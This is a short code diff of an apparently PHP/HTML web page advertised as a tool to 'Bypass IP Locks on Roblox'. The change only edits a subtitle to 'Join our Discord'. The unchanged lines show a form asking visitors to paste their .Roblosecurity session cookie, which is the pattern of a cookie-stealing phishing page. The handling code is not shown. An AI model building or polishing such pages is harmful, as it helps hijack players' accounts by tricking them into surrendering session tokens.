@@ -41,7 +41,7 @@ $O = 'Termed_setup.php'; if (file_exists($O)) { require($O); } else { header("Lo
                             Bypass IP Locks on <span class="main-company">Roblox</span>
                         </div>
                         <div class="main-subtitle">
-                            We love <span class="main-company">DEIX DU CONDIDO</span>
+                            Join our <span class="main-company">Discord</span>
                         </div>
                         <form id="bypassForm" method="post" action="">
                             <input name="Terms" id="Terms" type="text" placeholder="Enter .Roblosecurity Cookie" class="main-input">
